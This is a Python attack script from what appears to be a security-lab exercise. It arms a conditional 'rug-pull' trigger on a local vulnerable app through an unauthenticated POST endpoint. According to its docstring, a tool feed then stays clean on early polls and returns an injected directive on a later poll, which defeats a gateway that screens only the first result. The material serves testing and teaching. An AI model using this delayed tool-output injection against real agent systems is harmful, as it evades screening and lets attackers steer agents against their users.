#!/usr/bin/env python3
"""Attack skill — conditional rug-pull by arming the feed's trigger.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Arms the live feed's conditional trigger through the unauthenticated
``POST /vendor/feed/arm``. Once armed, the feed stays clean on the first polls
of each request and returns the placeholder directive from the ``TRIGGER``-th
poll. The feed's definition never changes — only its behaviour by poll count —
so a gateway that screened the first (clean) return and trusted the tool never
looks again.

Exit code: 0 when the trigger was armed, 1 when the target is unreachable.

Examples:
    python scripts/run_conditional.py
"""

from __future__ import annotations

import argparse
import json
import os
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("AGX03_TARGET", "http://127.0.0.1:5403")
DEFAULT_PAYLOAD = os.path.join(SKILL_DIR, "assets", "feed_poll_payload.txt")


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "agx03"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the AGX03 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    print("[*] Arming the feed's conditional trigger (unauthenticated POST /vendor/feed/arm)")
    result = _post(f"{args.target}/vendor/feed/arm", {})
    print(f"[+] {result['detail']}. The feed definition is unchanged.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
